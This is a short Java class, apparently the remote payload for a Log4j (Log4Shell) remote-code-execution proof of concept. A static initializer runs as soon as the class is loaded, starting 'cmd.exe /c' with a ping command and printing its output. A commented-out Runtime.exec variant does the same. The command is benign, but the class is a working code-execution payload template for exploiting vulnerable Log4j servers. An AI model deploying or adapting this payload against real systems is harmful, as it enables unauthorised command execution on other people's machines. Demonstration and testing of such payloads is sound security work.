import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Log4jRCE {

    static {
        System.out.println("I am Log4jRCE from remote!!!");
        ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c",
				"ping www.google.com");
		builder.redirectErrorStream(true);
		Process p;
		try {
			p = builder.start();
			BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line;
			while (true) {
				line = r.readLine();
				if (line == null) {
					break;
				}
				System.out.println(line);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        //     try {
    //        String[] cmd = {"ping www.google.com"};
     //       java.lang.Runtime.getRuntime().exec(cmd).waitFor();
      //  } catch (Exception e) {
       //     e.printStackTrace();
        //}
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
